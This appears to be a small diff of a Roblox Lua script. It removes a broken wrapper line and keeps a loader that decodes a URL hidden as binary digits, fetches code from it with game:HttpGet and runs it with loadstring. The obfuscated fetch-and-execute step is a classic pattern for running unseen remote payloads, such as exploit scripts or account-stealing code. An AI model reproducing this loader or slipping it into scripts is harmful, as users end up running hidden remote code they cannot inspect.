@@ -1,4 +1,3 @@
-loadstring(game:HttpGet("js
 local function fromBinary(bin)
     local str = ""
     for byte in bin:gmatch("%d%d%d%d%d%d%d%d") do
@@ -25,4 +24,4 @@ local binary = [[
 local url = fromBinary(binary:gsub("%s+", ""))
 
 local source = game:HttpGet(url)
-loadstring(source)()"))()
+loadstring(source)()
